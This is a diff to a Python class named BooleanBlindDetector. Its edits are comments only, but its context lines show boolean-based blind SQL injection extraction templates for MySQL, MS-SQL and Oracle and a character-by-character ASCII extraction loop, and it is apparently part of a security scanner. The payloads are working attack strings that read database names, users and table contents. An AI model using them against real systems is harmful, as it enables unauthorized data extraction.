@@ -68,13 +68,14 @@ class BooleanBlindDetector:
     
     # Extraction payloads for data retrieval using behavioral inference (Boolean-based Blind SQLi)
     # These payloads cause the application to behave differently if a tested condition is true or false
+    # Note: 'example' keys are for documentation/reference only and not used in extraction logic
     EXTRACTION_TEMPLATES = {
         'mysql': {
             'char_extraction': "' AND SUBSTRING({column},{position},1)='{char}'--",
             'ascii_extraction': "' AND ASCII(SUBSTRING({column},{position},1))={ascii_code}--",
             'length_check': "' AND LENGTH({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
-            # Example from problem statement: MySQL ASCII extraction
+            # Documentation: Example from problem statement
             'example': "' AND ASCII(SUBSTRING((SELECT database()),1,1))=68--"
         },
         'postgresql': {
@@ -88,7 +89,7 @@ class BooleanBlindDetector:
             'ascii_extraction': "' AND ASCII(SUBSTRING({column},{position},1))={ascii_code}--",
             'length_check': "' AND LEN({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
-            # Example from problem statement: MS-SQL ASCII extraction
+            # Documentation: Example from problem statement
             'example': "' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=68--"
         },
         'oracle': {
@@ -96,7 +97,7 @@ class BooleanBlindDetector:
             'ascii_extraction': "' AND ASCII(SUBSTR({column},{position},1))={ascii_code}--",
             'length_check': "' AND LENGTH({column})={length}--",
             'exists_check': "' AND EXISTS(SELECT 1 FROM {table} WHERE {condition})--",
-            # Example from problem statement: Oracle ASCII extraction
+            # Documentation: Example from problem statement
             'example': "' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))=68--"
         },
     }
@@ -349,7 +350,7 @@ class BooleanBlindDetector:
             found_char = None
             
             if use_ascii:
-                # Use ASCII code comparison (more efficient, range 32-126 for printable chars)
+                # Use ASCII code comparison (more efficient, testing ASCII 32-126 inclusive)
                 for ascii_code in range(32, 127):
                     # Build ASCII-based extraction payload using template
                     if 'ascii_extraction' in templates:
